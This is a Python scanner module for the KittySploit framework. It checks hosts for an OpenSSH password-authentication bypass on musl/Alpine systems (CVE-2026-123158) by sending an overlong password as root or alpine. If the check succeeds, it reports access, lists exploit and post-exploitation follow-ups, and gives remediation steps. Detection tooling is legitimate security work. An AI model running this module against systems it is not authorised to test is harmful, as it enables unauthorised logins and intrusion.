#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect OpenSSH musl password-auth bypass (CVE-2026-123158 / SSHole)."""

from kittysploit import *
from lib.protocols.tcp.tcp_scanner_client import Tcp_scanner_client
from lib.scanner.ssh.detectors import probe_openssh_sshole_bypass_users


class Module(Scanner, Tcp_scanner_client):
    __info__ = {
        "name": "OpenSSH CVE-2026-123158 (SSHole) Detect",
        "description": (
            "CVE-2026-123158: on musl-based Linux (Alpine, etc.) with OpenSSH built without "
            "PAM and PasswordAuthentication enabled, accounts whose shadow password field is "
            "* may accept an overlong password (257+ bytes). Verifies with a short control "
            "password then a single overlong attempt per username."
        ),
        "author": ["Özgün Kültekin", "KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-123158"],
        "tags": ["ssh", "openssh", "alpine", "musl", "auth-bypass", "cve-2026-123158", "sshole"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-123158",
            "https://alpinelinux.org/posts/2026-11-05-openssh-password-authentication-bypass/",
            "https://github.com/oz9un/sshole",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["credential_spray", "network_probe"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": True,
            "produces": ["risk_signals", "tech_hints", "credentials"],
            "requires": {"tech_hints_any": ["openssh", "alpine", "ssh"]},
            "chain": {
                "produces_capabilities": [
                    {"capability": "ssh_access", "from_detail": "username"},
                    "authenticated_session",
                ],
                "suggested_followups": [
                    "exploits/linux/ssh/openssh_cve_2026_123158_sshhole",
                    "post/shell/linux/gather/enum_system",
                ],
            },
        },
    }

    port = OptPort(22, "SSH port", True)
    usernames = OptString(
        "root,alpine",
        "Comma-separated usernames to test (accounts with shadow password field *)",
        required=False,
    )
    password_length = OptInteger(300, "Overlong password length (257-1024)", required=False, advanced=True)

    def run(self):
        host = self._host()
        port = self._port()
        if not host or not self.is_tcp_open(host=host, port=port):
            return False

        users = [u.strip() for u in str(self.usernames or "root,alpine").split(",") if u.strip()]
        info = probe_openssh_sshole_bypass_users(
            host,
            port,
            usernames=users,
            password_length=int(self.password_length or 300),
            timeout=max(self._timeout(), 8.0),
        )
        if info.get("error") == "paramiko_required":
            print_info("Paramiko required for CVE-2026-123158 verification")
            return False
        if info.get("error") == "openssh_banner_at_or_past_fix":
            print_status("OpenSSH banner indicates a fixed release (10.6p2+)")
            return False
        if not info.get("vulnerable"):
            reason = info.get("error") or "No musl OpenSSH password bypass observed"
            if info.get("banner"):
                reason = f"{reason} | {info.get('banner', '')[:80]}"
            print_status(reason)
            return False

        user = str(info.get("username") or "")
        banner = str(info.get("banner") or "").strip()
        version = str(info.get("openssh_version") or "")
        pw_len = info.get("password_length")
        detail = f"SSHole bypass as {user} (password length {pw_len})"
        if banner:
            detail = f"{detail} | {banner[:120]}"
        self.report_finding(
            "OpenSSH musl password authentication bypass (CVE-2026-123158)",
            severity="critical",
            evidence={
                "host": host,
                "port": port,
                "username": user,
                "banner": banner,
                "openssh_version": version,
                "password_length": pw_len,
                "cve": "CVE-2026-123158",
            },
            impact={
                "summary": "Unauthenticated network attackers can log into key-only or locked accounts.",
                "business_risk": "Remote shell on Alpine/musl hosts without valid credentials",
            },
            remediation={
                "summary": "Upgrade OpenSSH (10.6p2+) or Alpine openssh package and restart sshd.",
                "actions": [
                    "apk upgrade openssh && rc-service sshd restart",
                    "Or set PasswordAuthentication no until patched",
                    "Prefer PAM-enabled openssh-server-pam with UsePAM yes on Alpine",
                ],
            },
        )
        self.set_info(
            severity="critical",
            cve="CVE-2026-123158",
            reason=detail,
            username=user,
            banner=banner,
            confidence="high",
        )
        return True
